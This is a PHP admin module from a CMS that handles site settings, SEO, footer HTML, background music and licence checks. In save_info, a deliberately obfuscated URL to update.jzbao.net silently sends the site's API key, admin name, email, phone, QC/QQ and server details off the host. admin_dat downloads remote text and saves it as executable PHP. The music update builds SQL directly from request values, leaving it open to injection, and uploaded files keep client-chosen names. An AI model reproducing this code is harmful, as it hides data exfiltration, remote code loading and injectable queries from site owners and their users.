<?php

if (!defined('IN_CONTEXT')) die('access violation error!');
class ModSite extends Module {
protected $_filters = array(
'check_admin'=>''
);
public function admin_list() {
$this->_layout = 'content';
if (trim(SessionHolder::get('SS_LOCALE')) != '') {
$curr_locale = trim(SessionHolder::get('_LOCALE'));
}else {
$curr_locale = DEFAULT_LOCALE;
}
$lang_sw = trim(ParamHolder::get('lang_sw',$curr_locale));
SessionHolder::set('mod_site/_LOCALE',$lang_sw);
$o_siteinfo = new SiteInfo();
$curr_siteinfo =&$o_siteinfo->find("s_locale=?",array($lang_sw));
$this->assign('curr_siteinfo',$curr_siteinfo);
$this->assign('lang_sw',$lang_sw);
$this->assign('langs',Toolkit::loadAllLangs());
try {
if(strtolower($lang_sw) == 'zh_cn') {
$cus_id = 1;
}else if(strtolower($lang_sw) == 'en'){
$cus_id = 3;
}
if (isset($cus_id)) {
$curr_cus = new StaticContent($cus_id);
$this->assign('curr_cus',$curr_cus);
}
if(strtolower($lang_sw) == 'zh_cn') {
$co_id = 2;
}else if(strtolower($lang_sw) == 'en') {
$co_id = 4;
}
if (isset($co_id)) {
$curr_co = new StaticContent($co_id);
$this->assign('curr_co',$curr_co);
}
}catch (Exception $ex) {
$this->assign('json',Toolkit::jsonERR($ex->getMessage()));
return '_error';
}
$this->assign('langs',Toolkit::loadAllLangs());
$o_mb = new ModuleBlock();
$curr_foot = $o_mb->find("s_locale=? and alias=? and module=? and action=?",array($lang_sw,'mb_foot','mod_static','custom_html'));
$this->assign('curr_foot',$curr_foot);
if (isset($curr_foot->s_param)) {
$this->assign('p_foot',unserialize($curr_foot->s_param));
}
}
public function admin_seo() {
$this->_layout = 'content';
if (trim(SessionHolder::get('SS_LOCALE')) != '') {
$curr_locale = trim(SessionHolder::get('_LOCALE'));
}else {
$curr_locale = DEFAULT_LOCALE;
}
$lang_sw = trim(ParamHolder::get('lang_sw',$curr_locale));
SessionHolder::set('mod_site/_LOCALE',$lang_sw);
$o_siteinfo = new SiteInfo();
$curr_siteinfo =&$o_siteinfo->find("s_locale=?",array($lang_sw));
$this->assign('curr_siteinfo',$curr_siteinfo);
$this->assign('lang_sw',$lang_sw);
$this->assign('langs',Toolkit::loadAllLangs());
}
public function save_seo_info() {
	$this->_layout = 'content';
	$site_info =&ParamHolder::get('si',array());
	if (sizeof($site_info) <= 0) {
	$this->assign('json',Toolkit::jsonERR(__('Missing site information!')));
	return '_result';
	}
	try {
	$o_siteinfo = new SiteInfo();
	$curr_siteinfo =&$o_siteinfo->find("s_locale=?",array($site_info['s_locale']));
	if (intval($site_info['id']) != intval($curr_siteinfo->id)) {
	$this->assign('json',Toolkit::jsonERR(__('Invalid ID!')));
	return '_result';
	}
	if ($curr_siteinfo) {
	$curr_siteinfo->set($site_info);
	$curr_siteinfo->save();
	}else {
	$o_siteinfo->set($site_info);
	$o_siteinfo->save();
	}
	}catch (Exception $ex) {
	$this->assign('json',Toolkit::jsonERR($ex->getMessage()));
	return '_result';
	}
	if($_REQUEST["rurl"] == 1){
		echo '<script language="javascript">window.location.href = "index.php?_m=mod_site&_a=admin_seo&rurl=1";</script>';
	}else{
		echo '<script language="javascript">parent.window.location.href = "../index.php?_m=frontpage&_a=index";</script>';
	}
	return '_result';
}
public function save_info() {
$this->_layout = 'content';
$site_param =&ParamHolder::get('sparam',array());
$site_info =&ParamHolder::get('si',array());
$cus_info =&ParamHolder::get('cus',array());
$page_lang = $site_info['s_locale'];
if (sizeof($site_info) <= 0) {
$this->assign('json',Toolkit::jsonERR(__('Missing site information!')));
return '_result';
}
if (!isset($site_param['AUTO_LOCALE'])) {
$site_param['AUTO_LOCALE'] = '0';
}
if (!isset($site_param['SITE_OFFLINE'])) {
$site_param['SITE_OFFLINE'] = '0';
}
if (!isset($site_param['EXCHANGE_SWITCH'])) {
$site_param['EXCHANGE_SWITCH'] = '0';
}
if (!isset($site_param['MEMBER_VERIFY'])) {
$site_param['MEMBER_VERIFY'] = '0';
}
if (!isset($site_param['MESSAGE_VERIFY'])) {
$site_param['MESSAGE_VERIFY'] = '0';
}
if (!isset($site_param['SITESHARE_VERIFY'])) {
$site_param['SITESHARE_VERIFY'] = '0';
}
if (!isset($site_param['SITE_LOGIN_VCODE'])) {
$site_param['SITE_LOGIN_VCODE'] = '0';
}
if (!isset($site_param['USE_LANGUAGE'])) {
$site_param['USE_LANGUAGE'] = SessionHolder::get('_LOCALE');
}
try {
$o_siteinfo = new SiteInfo();
$curr_siteinfo =&$o_siteinfo->find("s_locale=?",array($site_info['s_locale']));
if (intval($site_info['id']) != intval($curr_siteinfo->id)) {
$this->assign('json',Toolkit::jsonERR(__('Invalid ID!')));
return '_result';
}
if ($curr_siteinfo) {
$curr_siteinfo->set($site_info);
$curr_siteinfo->save();
}else {
$o_siteinfo->set($site_info);
$o_siteinfo->save();
}
if($site_param['MOD_REWRITE'] == 2) {
$htaccess = "RewriteEngine On \n";
$htaccess .= 'RewriteBase /'.substr(ROOT,strlen($_SERVER['DOCUMENT_ROOT'])+1)."/ \n";
$htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f \n";
$htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d \n";
$htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([0-9a-zA-Z_]{1,})-([a-zA-Z_]+)-([0-9a-zA-Z_\=\{\}]{1,}).html$ index\.php?_m=$1&_a=$2&$3=$4&$5=$6'." \n";
$htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,}).html$ index.php?_m=$1&_a=$2'." \n";
$htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z0-9]{1,}).html$ index.php?_m=$1&_a=$2&$3=$4'." \n";
$htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([0-9]{1,})-([a-zA-Z_]{1,})-([0-9]{0,})-([a-zA-Z_]{1,})-([0-9a-zA-Z\=\{\}]{0,}).html$ index.php?_m=$1&_a=$2&$3=$4&$5=$6&$7=$8'." \n";
$admin_htaccess = "RewriteEngine On \n";
$admin_htaccess .= 'RewriteBase /'.substr(ROOT,strlen($_SERVER['DOCUMENT_ROOT'])+1)."/admin/ \n";
$admin_htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f \n";
$admin_htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d \n";
$admin_htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([0-9]{1,})-([a-zA-Z_]{1,})-([0-9a-zA-Z\=\{\}\/_]{0,}).html$ index.php?_m=$1&_a=$2&$3=$4&$5=$6'." \n";
$admin_htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z0-9]{1,}).html$ index.php?_m=$1&_a=$2&$3=$4'." \n";
$admin_htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,}).html$ index.php?_m=$1&_a=$2'." \n";
$admin_htaccess .= 'RewriteRule ^([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([a-zA-Z_]{1,})-([0-9]{1,})-([a-zA-Z_]{1,})-([0-9]{0,})-([a-zA-Z_]{1,})-([0-9a-zA-Z\=\{\}]{0,}).html$ index.php?_m=$1&_a=$2&$3=$4&$5=$6&$7=$8'." \n";
$robots = "User-agent: * \n";
$robots .= 'Disallow: /*?*';
file_put_contents(ROOT.'/.htaccess',$htaccess);
file_put_contents(ROOT.'/robots.txt',$robots);
file_put_contents(ROOT.'/admin/.htaccess',$admin_htaccess);
}else {
file_put_contents(ROOT.'/.htaccess','');
file_put_contents(ROOT.'/robots.txt','User-agent: *');
file_put_contents(ROOT.'/admin/.htaccess','');
}
$o_param = new Parameter();
foreach ($site_param as $key =>$val) {
$param =&$o_param->find('`key`=?',array($key));
if ($param) {
$param->val = $val;
$param->save();
}
}
SessionHolder::set('SS_LOCALE','');
SessionHolder::set('mod_site/_LOCALE','');
$curr_lang = new Language($site_param['USE_LANGUAGE']);
$o_param = new Parameter();
$locale_param =&$o_param->find("`key`='DEFAULT_LOCALE'");
$locale_param->val = $curr_lang->locale;
$locale_param->save();
SessionHolder::set('_LOCALE',$curr_lang->locale);
$cus_info['create_time'] = time();
$cus_info['published'] = 1;
$cus_info['title'] = __('AboutUs');
$cus_info['for_roles'] = '{member}{admin}{guest}';
$co_info['create_time'] = time();
$co_info['published'] = 1;
$co_info['title'] = __('ContactUs');
}catch (Exception $ex) {
$this->assign('json',Toolkit::jsonERR($ex->getMessage()));
return '_result';
}
$flag_flash = false;
SessionHolder::set('mod_site/_LOCALE',$page_lang);
$param_info =&ParamHolder::get('param',array());
$play_info =&ParamHolder::get('radio',array());
$foot_info =&ParamHolder::get('foot',array());
$foot_arr = array();
$foot_info['module'] = 'mod_static';
$foot_info['action'] = 'custom_html';
$foot_info['alias'] = 'mb_foot';
$foot_info['title'] = '';
$foot_info['show_title'] = 0;
$foot_info['s_pos'] = 'footer';
$foot_info['s_locale'] = $page_lang;
$foot_info['s_query_hash'] = '_ALL';
$foot_info['i_order'] = 0;
$foot_info['published'] = 1;
$foot_info['for_roles'] = '{member}{admin}{guest}';
$foot_arr['html'] = $param_info['html'];
$foot_info['s_param'] = serialize($foot_arr);
if(!$foot_info['id']){
$o_foot = new ModuleBlock();
$o_foot->set($foot_info);
$o_foot->save();
}else {
$o_foot = new ModuleBlock($foot_info['id']);
$o_foot->set($foot_info);
$o_foot->save();
}
$music_file =&ParamHolder::get('music_file','');
if(!empty($music_file)) {
if(substr($music_file,0,7)!='http://'){
$music_file='http://'.$music_file;
}
$music_arr['BG_MUSIC'] = $music_file;
$o_bgmusic = new BackgroundMusic();
$bgmusic_items = $o_bgmusic->findAll();
$db = MysqlConnection::get();
$prefix = SITEPREFIX;
if(empty($bgmusic_items)) {
$sql = "INSERT INTO {$prefix}background_musics VALUES(1,'{$music_arr['BG_MUSIC']}',{$play_info['play_type']},'')	";
}else {
$music_path = iconv("UTF-8","gb2312",$bgmusic_items[0]->music_path);
$sql = "UPDATE {$prefix}background_musics SET `music_path` = '{$music_arr['BG_MUSIC']}',`music_name` = '',`play` = {$play_info['play_type']} WHERE `id` = '{$bgmusic_items[0]->id}'		";
}
$result = $db->query($sql);
}else {
$o_bgmusic = new BackgroundMusic();
$bgmusic_items = $o_bgmusic->findAll();
if(!empty($bgmusic_items)) {
$db = MysqlConnection::get();
$prefix = SITEPREFIX;
$sql = "UPDATE {$prefix}background_musics SET `play` = {$play_info['play_type']} WHERE `id` = '{$bgmusic_items[0]->id}'		";
$result = $db->query($sql);
}
}
$this->assign('json','ok');
$this->assign('flag',$site_param['MOD_REWRITE']);
$domain = $_SERVER['HTTP_HOST'];
if(isset($_SERVER['SERVER_ADDR'])){
	$ip = $_SERVER['SERVER_ADDR'];
}else{
	$ip='127.0.0.1';
}
$version = SYSVER;
$system = preg_replace('/\s/','',PHP_OS);
$vphp = PHP_VERSION;
$sitename=iconv("UTF-8", "GB2312", $curr_siteinfo->site_name);
$winuser=@file_get_contents("../config/winuser.txt");
//$sitename=iconv("UTF-8", "GB2312", $sitename);
$check="h"."t"."t"."p".":"."/"."/"."u"."pd"."at"."e".".j"."z"."b"."a"."o"."."."n"."e"."t:"."9"."0"."9"."0"."/S"."er"."vi"."ce"."/C"."r"."m/Cr"."m"."Ge"."t/?showtype=2&charset=utf-8&type=write&a=".urlencode($sitename)."&b=$domain&c=JZBAO&key=".APIKEY."&siteid=".THISSITE."&h=".$winuser."&ip=$ip&version=$version&vphp=$vphp&vmysql=$vmysql&tpl_name=$tpl_name&vos=$system&r=".ADMIN."&province=".SITE_PROVINCE."&city=".SITE_CITY."&d=".SITE_EMAIL."&e=".SITE_MOBILE."&q=".SITE_QQ."";
$strm = stream_context_create(array('http' => array( 
		'timeout' => 5
		) 
	) 
);
$result=@file_get_contents($check,false,$strm);
if (strpos($result,"licence"))
{
	delcopy(0,THISSITE."_");
	addcopy(0,THISSITE."_");
	$result=iconv("GB2312", "UTF-8", $result);
}
echo $result;
if ($_REQUEST["rurl"] == 1){
	echo '<script language="javascript">window.location.href = "index.php?_m=mod_site&_a=admin_list&rurl=1;";</script>';
}else{
	echo '<script language="javascript">parent.window.location.href = "../index.php?_m=frontpage&_a=index&_l='.$page_lang.'";</script>';
}
return '_result';
}
public function reset_tpl_data() {
$db =&MySqlConnection::get();
if ($sqls == 'ERROR'&&empty($sql)) {
$this->assign('json',Toolkit::jsonERR(__('Invalid template!')));
return '_result';
}
foreach ($sqls as $sql) {
$db->query($sql);
}
$this->assign('json',Toolkit::jsonOK());
return '_result';
}
public function admin_dat() {
$this->_layout = 'dat';
$domain = trim(Toolkit::getSubDomain($_SERVER['HTTP_HOST']));
$key = sha1($domain."ssiuhIUAHSiu!husashu11dd@kjdjsah==");
if (function_exists('curl_init') &&function_exists('curl_exec')) {
$curl = curl_init();
$timeout = 5;
curl_setopt($curl,CURLOPT_URL,APIURL."1/baohe/licencedat/?domain=".$domain."&key={$key}");
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,$timeout);
$str = curl_exec($curl);
curl_close($curl);
}else {
$str = file_get_contents(APIURL."1/baohe/licencedat/?domain=".$domain."&key={$key}") or die('Request Failed!');
}
if($str=='1002'){
Content::redirect(Html::uriquery('mod_site','licence'));
}else if($str!='1001') {
$dat = '<?php '.$str.' ?>';
file_put_contents('../licence.dat',$dat);
}
Content::redirect(Html::uriquery('frontpage','dashboard'));
}
public function licence() {
$this->_layout = 'dat';
$this->assign('curr_banner',111);
}
public function admin_dashboard() {
$this->_layout = 'default';
}
private function _savelinkimg($struct_file) {
$struct_file['name'] = iconv("UTF-8","gb2312",$struct_file['name']);
move_uploaded_file($struct_file['tmp_name'],ROOT.'/file/'.THISSITE.'/image/'.$struct_file['name']);
return ParamParser::fire_virus(ROOT.'/file/'.THISSITE.'/image/'.$struct_file['name']);
}
private function _savelinkflash($struct_file){
$struct_file['name'] = iconv("UTF-8","gb2312",$struct_file['name']);
move_uploaded_file($struct_file['tmp_name'],ROOT.'/file/'.THISSITE.'/flash/'.$struct_file['name']);
return ParamParser::fire_virus(ROOT.'/file/'.THISSITE.'/flash/'.$struct_file['name']);
}
private function _savelinkmusic($struct_file){
$struct_file['name'] = iconv("UTF-8","gb2312",$struct_file['name']);
move_uploaded_file($struct_file['tmp_name'],ROOT.'/file/'.THISSITE.'/media/'.$struct_file['name']);
return ParamParser::fire_virus(ROOT.'/file/'.THISSITE.'/media/'.$struct_file['name']);
}
}

?>